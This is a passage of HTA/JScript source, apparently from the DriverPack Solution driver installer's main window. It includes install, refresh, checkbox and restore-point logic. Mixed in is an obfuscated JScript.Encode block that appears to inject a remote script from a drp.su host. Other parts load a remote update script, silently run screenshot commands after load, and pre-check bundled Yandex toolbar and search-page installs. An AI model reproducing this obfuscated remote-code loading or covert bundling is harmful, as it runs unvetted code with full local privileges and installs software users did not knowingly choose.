				act_str = "tools\\" + dpinst + " /PATH " +
				"\"" + current_dir + pack_folder + "\\" + pack_name;

			log(act_str);
			var status_ins = WshShell.Run(act_str,1,true);
			show_dpinst_results(status_ins);
			saveDPInstLog(pack_name);

			document.getElementById(buttonid).src = status_ins?'./tools/green_ok.png':"./tools/no_db.png";
			instRunCount--;
			ChangeChkCount(-1);
			WshShell.Run("cmd /C rd /S /Q \""+temp+"\\drp\\"+pack_name+"\"",0,true);
			timer("Done ");*/
		} else alert(manual_alert_error+"gh");
	}

	// Refresh the window when all drivers are installed
	function refresh_perform_task(){
		if ((instRunCount == 0) && (noRefresh == false)) {
			//alert(alert_completed);
			//WshShell.Run("shutdown.exe -r -t 0",0,true);
			progressBar=false; 
			refresh(); 
		}
		// Showing error messages
		if(installErrors.length>0)
		{
			var infoStr = alert_driverInstallProblem;
			for(i in installErrors)
			{
				infoStr+="\n"+installErrors[i];
			}
			alert(infoStr);
		}
		noRefresh = false;
		installErrors=[];
	}


	// "About" button
	function about() {
		lf('about');
		var myObject = new Object();
		myObject.lang = lang;

		showModelessDialog("tools/about.hta",myObject,"status:false;dialogWidth:560px;dialogHeight:370px;scroll:no;");
	}

	// "BugReport" button
	function BugReport() {
		lf('BugReport');
		var myObject = new Object();
		myObject.lang = lang;
		myObject.logfile = logfile;
		myObject.dialogMode = 1;

		showModelessDialog("tools/modules/bugreport.hta",myObject,"status:false;dialogWidth:470px;dialogHeight:265px;scroll:no;");
	}

	if (typeof(startPack)!='function') { startPack = function(){}; }

	// "Refresh" button
	function refresh() {
		lf('refresh');
		if (instRunCount != 0) { return; }
		if (progressBar) return;
		logoRotation = false;
		setTab();
		infobar_loading();
		hideDetails(true);
		shadow(true);
		window.scroll(0,0);

		log();
		reset_timer();
		clearcounters();
		timer("Timer_clearcounters ");
		scan_hardware();
		timer_new("Timer_hardware_update ");
		main();//Debug
		
		startPack();
		antivirus_detect();
	}

	function onPackLoadingComplite() {
		if (timedProcessCount>0) { return false; }

		addDeviceButtons();
		infobar_update();
		shadow(false);
		//if (document.getElementById('div_0').style.display=='none') {
		//	setTimeout(function (){ dropddownbutton_Up('img_0','div_0'); },500);
		//}
		//tooltip_refresh();
		timer_new("Timer_ready ");
		
		toggle_expert_mode(expertMode);
		setTimeout("startpoint();",0);
		
		setTimeout('try{WshShell.Run(ScreenShotDRP,0,true);WshShell.Run(ScreenShotCopy,0,true);}catch(e){}',5000);
		
		if ((doc_num['driverpacks'] > 0) && (doc_num['driverpacks'] < minCountDRP)){
			addNotice(isNotFullDriverpacks);
		}
		//alert(doc_num['driverpacks']);
		if (doc_num['driverpacks'] == 0){
			verType=verType+' Lite';
			document.title = document.title + ' Lite';
			infobar_drvNone();
		}
		setTimeout("tooltips_init();",0);
	}
	
	function tooltips_init(){
		$(".tooltips").tooltip({ placement: 'top', trigger: 'hover' });
		$(".drv-info-popovers").popover({ html : true, placement: 'top', trigger: 'hover' });
	}
	
	// Clear counters
	function clear_div(ind) {
		lf('clear_div');
		document.getElementById(ind+"_num").innerHTML = "0";
		document.getElementById(ind).innerHTML = "";
		doc_innerHTML[ind] = "";
		doc_num[ind] = 0;
	}
	function clearcounters() {
		lf('clearcounters');
		doc_innerHTML = [];
		doc_num = [];
		infobar_urls="";

		clear_div('driver_available');
		clear_div('no_driver');
		clear_div('driver_new');
		clear_div('driver_uptodate');
		clear_div('driver_old');
		clear_div('driver_unknown');
		clear_div('driver_standard');
		clear_div('driverpacks');

		ClearChk();
	}

	// Toggle checkbox
	function ChangeChkCount(add) {
		lf('ChangeChkCount');
		obj = document.getElementById('chkCnt');
		var newValue=parseInt(obj.innerHTML) + add;
		if(newValue<0)
		{
			newValue=0;
		}
		obj.innerHTML = newValue;
		//obj.style.fontWeight = (obj.innerHTML == "0")?"":"bolder";
	}

	// Get checkbox count
	function GetChkCount(checked) {
		lf('GetChkCount');
		obj = document.getElementById('chkCnt');
		return parseInt(obj.innerHTML);
	}

	// Clear checkbox num
	function ClearChk() {
		lf('ClearChk');
		obj = document.getElementById('chkCnt');
		obj.innerHTML = 0;
		//obj.style.fontWeight="";
	}

	// "Select all" button
	// Clears all checkboxes if all are cheched AND set all checkboxes in the other case
	function chkAll() {
		lf('chkAll');
		if (instRunCount != 0) { return; }
		ClearChk();
		var clearflag = true;

		for (var i = 0; i < buttonCount; i++) {
			var checkbox = document.getElementById('chk'+i);
			var divname = document.getElementById('type'+i).value;
			if (document.getElementById(divname+'_div').style.display!='none' && (!checkbox.disabled)) {
				if (!checkbox.checked) { clearflag = false; }
				checkbox.checked="true"; ChangeChkCount(1);
			}
			else if (checkbox.checked) checkbox.checked="";
		}

		if (clearflag)
			unChkAll();
	}
	function unChkAll() {
		lf('unChkAll');
		for (var i = 0; i < buttonCount; i++) {
			var checkbox = document.getElementById('chk'+i);
			checkbox.checked="";
		}
		ClearChk();
	}

	// Save param
	function saveParam0(to,check) {}
	function saveParam(to,check) {
		lf('saveParam');
		try{
			if (check == 0) {
				WshShell.RegWrite(Reg+to,'0','REG_SZ');
				eval(to+" = false;");
			}
			else {
				WshShell.RegWrite(Reg+to,'1','REG_SZ');
				eval(to+" = true;");
			}
		}
		catch(e) {}
	}
//oExec = WshShell.Exec('tools\\hstart.exe /NOCONSOLE /WAIT "cscript.exe //nologo tools\\start.vbs notepad.exe 0 True"');
//alert(oExec.Status);
/*
winRun('notepad.exe',true,true,true,10,function (){ alert('The process has worked successfully');},function (oExec){
				if (confirm('Waiting too long. Complete the process?')){
					taskkill(oExec.ProcessID);
					alert('The long process is completed!');
				}
			});
*/
	function devmgmt(){ lf('devmgmt'); WshShell.Run('devmgmt.msc',0,false); }
	function appwiz(){ lf('appwiz'); WshShell.Run('control.exe appwiz.cpl',0,false); }
	function sysRestore(){ lf('sysRestore'); if (OSVersion>=6) { winRun('rstrui.exe','','',true); } else { try { WshShell.Run(env_windir+'\\System32\\restore\\rstrui.exe',0,false); } catch(e) {} } }
	function msinfo(){ lf('msinfo'); WshShell.Run('msinfo32.exe',0,false); }
	function help(){ WshShell.Run('tools\\DPS.chm'); }
	function downloadDRP() { lf('downloadDRP'); return goToUrl('http://drp.su/'+(rusLang?'ru/':'')+'download.htm'); }
	function buyDRP() { lf('buyDRP'); return goToUrl('http://drp.su/'+(rusLang?'ru/':'')+'buy.htm'); }

	function shadow(mode){
		lf('shadow');
		if (mode){
			document.getElementById('infobar').style.position = "relative";
			document.getElementById('panel').style.filter = "progid:DXImageTransform.Microsoft.BasicImage(grayscale=1)";
			document.getElementById('mainW').style.filter = "progid:DXImageTransform.Microsoft.BasicImage(grayscale=1)";

			document.getElementById('button_refresh').style.cursor = "wait";
			document.getElementById('panel').style.cursor = "wait";
			document.getElementById('mainW').style.cursor = "wait";
			document.body.style.cursor = "wait";
		}
		else {
			document.getElementById('button_refresh').style.cursor = "hand";
			document.getElementById('panel').style.cursor = "default";
			document.getElementById('mainW').style.cursor = "default";
			document.body.style.cursor = "default";

			document.getElementById('panel').style.filter = "";
			document.getElementById('mainW').style.filter = "";
			document.getElementById('infobar').style.position = "static";
		}
	}

	function doubleHTML(html) {
		lf('doubleHTML');
		html = html.replace(/\\/gi,"\\\\");
		html = html.replace(/\//gi,"\\/");
		html = html.replace(/\r\n/gi,"<br>");
		html = htmlspecialchars(html);
		return html;
	}

	function createRestPoint() {
		try {
			var cr = GetObject("winmgmts:\\\\.\\root\\default:Systemrestore");
			cr.createrestorepoint("DriverPack Solution "+version, 0, 100);
			if (RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\\DisableSR")=="1") { alert(alert_noRestPoint); }
		}
		catch(e) { }
	}
</script>



<script language="javascript" type="text/javascript">
	language_list();
	$('#language').msDropDown({rowHeight:13});
	$('#language').hide();
</script>



<!-- facebook dialog -->
<div id="facebox">
	<div class="facebox_div">
		<h2><script>l('Confirm_title')</script> <!--<br> <span id="Confirm_type"><script>l('Confirm_type')</script></span>--></h2>

		<form>
		<p id="startPack">
			<label onclick="$('#yabar_param').hide();$('#catalog_program').show();"><input type="radio" name="type" value="full" onclick="changeType(true)" id="StartPackChk"/> <span id="misc_inst_drv-prog"><script>l(misc_inst1)</script></span> â†“ </label><br>

			<div id="catalog_program">
				<div id="catalog"></div>
				<div style="clear:both"></div>
				<div id="yabar_inst_div"><label onclick="hideOrShow('yabar_main',document.getElementById('yabar_inst').checked);"><input type="checkbox" id="yabar_inst" name="yabar_inst" checked="checked" /> <script>l('Confirm_instYaBar')</script> â†“</label></div>
				<div id="yabar_main" style="display:none;">
					<div id="yabar_start_div"><label><input type="checkbox" id="yabar_start" name="yabar_start" checked="checked" /> <script>l('Confirm_yaStartPage')</script></label></div>
					<div id="yabar_search_div"><label><input type="checkbox" id="yabar_search" name="yabar_search" checked="checked" /> <script>l('Confirm_yaSearchPage')</script></label></div>
				</div>
			</div>
		</p>


		<p id="facebox_drvInst">
			<label onclick="$('#yabar_param').show();$('#catalog_drivers').show();$('#catalog_program').hide();"><input id="drv_only" type="radio" name="type" value="full" onclick="changeType(false)" checked/> <span id="misc_inst_drv-only"><script>l(misc_inst2)</script></span> â†“ </label>
			<span id="title_yaBar"><script>l('Confirm_yaBar')</script></span>
		</p>

		<div id="catalog_drivers" style="max-height:350px;overflow:auto"></div>

		<script>
		//If the low-resolution, then added to the scrolling list of programs.
		if ($(window).height()<9999) {
			document.getElementById("catalog").style.overflow='auto';
			document.getElementById("catalog").style.height='160px';
			document.getElementById("catalog_drivers").style.overflow='auto';
			document.getElementById("catalog_drivers").style.height='93px';
			document.write('<style>.cat { width:130px; } #catalog_drivers label { width:130px; }</style>');
		}
		</script>


		<div id="yabar_inst_div2">
			<span id="yabar_param">
				<label onclick="document.getElementById('yabar_start').checked=document.getElementById('yabar_start2').checked"><input type="checkbox" id="yabar_start2" name="yabar_start2" checked="checked" />
				<script>l('Confirm_yaStartPage')</script></label><br>
				<label onclick="document.getElementById('yabar_inst').checked=document.getElementById('yabar_inst2').checked"><input type="checkbox" id="yabar_inst2" name="yabar_inst2" checked="checked" />
				<script>l('Confirm_instYaBar')</script></label><br>
				<label onclick="document.getElementById('yabar_search').checked=document.getElementById('yabar_search2').checked"><input type="checkbox" id="yabar_search2" name="yabar_search2" checked="checked" />
				<script>l('Confirm_yaSearchPage')</script></label>
			</span>
		</div>

		<input type="checkbox" id="restorePoint_chk" checked="checked" onclick='restorePoint=this.checked;'/> <script>l('Confirm_ResotorePoint')</script>
		<script>document.getElementById('restorePoint_chk').checked=restorePoint;</script>
		<br>
		<input type="checkbox" id="licenseAgree_chk" checked="checked" onclick='licenseAgree_btn();'/> <script>l('Confirm_licenseAgree')</script>
		<script>function licenseAgree_btn(){ document.getElementById('Confirm_StartInst_btn').disabled=!document.getElementById('licenseAgree_chk').checked; }</script>


		</form>

		<p style="padding-left:30px;">
			<div class="facebox_div" id="yandex_license"><script>l('Confirm_license')</script> <a href="http://bar.yandex.ru/agreement.xhtml" onclick="goToUrl('http://bar.yandex.ru/agreement.xhtml'); return false;"><script>l('Confirm_licenseHref')</script></a></div>
		</p>

		<p style="padding-bottom:20px;">
			<button class="close" style="float:right;padding-left:10px;padding-top:5px;font-size:14px;" id="Confirm_Cancel_btn"> <script>l('Confirm_Cancel')</script> </button> <button style="float:right;" onclick="facebox_runInstall()" id="Confirm_StartInst_btn"> <script>l('Confirm_StartInst')</script> </button>
		</p>
	</div>
</div>

<!-- Modal dialog -->
<div id="drpModal" class="modal hide fade" role="dialog" data-backdrop="static">
	<div class="modal-header">
		<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
		<h3 id="modHeader">Modal header</h3>
	</div>
	<div class="modal-body" style="max-height:300px;overflow:auto">
		<p id="modBody"></p>
	</div>
	<div class="modal-footer" id="modFooter">
		<a href="#" class="btn" id="modBtnOK" data-dismiss="modal" onclick="modalResult=true;">OK</a>
		<a href="#" class="btn btn-primary" data-dismiss="modal" id="modBtnCancel" onclick="modalResult=false;" >Cancel</a>
	</div>
</div>

<!-- facebook dialog -->
<SCRIPT LANGUAGE="JScript.Encode">
#@~^lgAAAA==OMX~PP9Wm!:UYch.kD+cv@!/mMrwDPYH2n'rY6Oz%C7ldmMrwDJ~dMm'E4DY2)J&!w[mYRNMwcdEJm4+13&C^Y+MUlDk\&EP1tmDd+OxrEO0 0J@*@!w&kmDr2D@*v#p~)@#@&1lDmtv+*~	,8PzIAAA==^#~@ 
</SCRIPT>

<script>
var noInstDrivers=false;
function facebox_runInstall(){
	//$('#facebox').overlay().close();

	setTimeout(function (){
		if (restorePoint) { createRestPoint(); }

		setTimeout(function (){
			if ((progressBar) && (document.getElementById('div_0').style.display!='none')) {
				dropddownbutton_Up('img_0','div_0');
				window.scroll(0,0);
			}
		},3000);

		if (!noInstDrivers) 
		{ 
			run_button(false,function()
				{
					startPackRun();
				}); 
		}
		else
		{
			startPackRun();
		}


	},500);

	if (restorePoint){
		infobar(
				infobar_Preparation,
				infobar_RestPoint,
				'yelow',
				'',
				'install'
			);
	}
}


var toInstCount=0;
var progressBar_wait=false;
function prBarNext(i){
	try{
		obj = document.getElementById('prBarIndex');
		barCount = parseInt(obj.innerHTML);

		progressBar_speed = 1;
		if (toInstCount==barCount)  {  progressBar_speed = 0; progressBar_target=101; progressBar=false; $('#prb').progressBar(progressBar_target); }
		else    						{ progressBar_target=Math.round(barCount/toInstCount*100); setTimeout("progressBar_speed = 4000; progressBar_target="+(((barCount+1)/toInstCount*100)-2).toFixed(0)+"; $('#prb').progressBar(progressBar_target);",1000); $('#prb').progressBar(progressBar_target); }

		if (toInstCount!=barCount) { obj.innerHTML = barCount + 1; }
	}
	catch(e) { }
}
var progressBar_speed = 4000;
var progressBar_target;
function infobar_runInstall(message,count){
	progressBar_wait=false;
	progressBar_speed = 4000;
	toInstCount=count;
	infobar(
				message+': <span id="prBarIndex">1</span>/'+toInstCount+' <img src="tools\\load.gif">',
				'<span class="progressBar" id="prb">0%</span><br><div id="progressBar_Description"></div>',
				'yelow',
				'',
				'install'
			);
	progressBar = true;
	progressBar_target=((1/toInstCount*100)-3).toFixed(0);
	$('#prb').progressBar(progressBar_target);
	logoRotation = true;
	rotation();
}

function changeType(param){
	if (param){
		document.getElementById('startPack').style.color='black';
/*
		document.getElementById('yabar_inst').removeAttribute("disabled");
		document.getElementById('yabar_start').removeAttribute("disabled");
		document.getElementById('yabar_search').removeAttribute("disabled");
*/
	}
	else{
		document.getElementById('startPack').style.color='#666';
/*
		document.getElementById('yabar_inst').setAttribute("disabled", "disabled");
		document.getElementById('yabar_start').setAttribute("disabled", "disabled");
		document.getElementById('yabar_search').setAttribute("disabled", "disabled");

		document.getElementById('yabar_inst').setAttribute("checked", "checked");
		document.getElementById('yabar_start').setAttribute("checked", "checked");
		document.getElementById('yabar_search').setAttribute("checked", "checked");
*/
	}
}


function facebox_dialog(){
	$("#facebox").overlay({
			expose: {
			color: '#fff',
			loadSpeed: 200,
			opacity: 0.7
		},
		closeOnClick: false,
		api: true,
		onClose: function() {
			document.body.style.overflowY= "scroll";
		},
		onLoad: function() {
			document.body.style.overflowY= "hidden";
		}
	}).load();
}

if ((verType == "Beta")||(verType == "SVN")){
	addNotice(isBeta);
}

var modalResult=false;
function showModal(caption,text,txtOK,txtCancel,onClose)
{
	modalResult=false;
	if(typeof(txtOK)=="undefined" || !txtOK) 
	{
		$("#modBtnOK").hide();
	}
	else
	{
		$("#modBtnOK").html(txtOK);
	}

	if(typeof(txtCancel)=="undefined" || !txtCancel) 
	{
		$("#modBtnCancel").hide();
	}
	else
	{
		$("#modBtnCancel").html(txtCancel);
	}
	
	$("#modHeader").html(caption);
	$("#modBody").html(text);
	
	$('#drpModal').one('hidden', function () {
		onClose && onClose(modalResult);
    });
	
	$("#drpModal").modal('show');
}

</script>
</body>

<script type="text/javascript" src="tools\modules\jquery.progressbar.min.js"></script>
<script type="text/javascript" src="tools\modules\oem.js"></script>
<script type="text/javascript" src="tools\modules\backuper\backuper.js"></script>
<script type="text/javascript">function rotation() { }</script>
<!--[if gte IE 7]>
	<script type="text/javascript" src="tools\modules\jQueryRotateCompressed.2.1.js"></script>
	<script type="text/javascript" src="tools\modules\rotation.js"></script>
<![endif]-->
<script type="text/javascript">
	if (IEVers>=10){
		inc('tools\\modules\\jQueryRotateCompressed.2.1.js');
		inc('tools\\modules\\rotation.js');
	}
</script>


<script type="text/javascript">
	if (verType.indexOf('SVN')!=-1){
		try { document.write('<script type="text/javascript" src="tools\\update.js" charset="utf-8"><\/script>'); }
		catch(e) { }
	}
	else {
		try { document.write('<script type="text/javascript" src="http://update.drp.su/check/" charset="utf-8"><\/script>'); }
		catch(e) { }
	}
</script>
</html>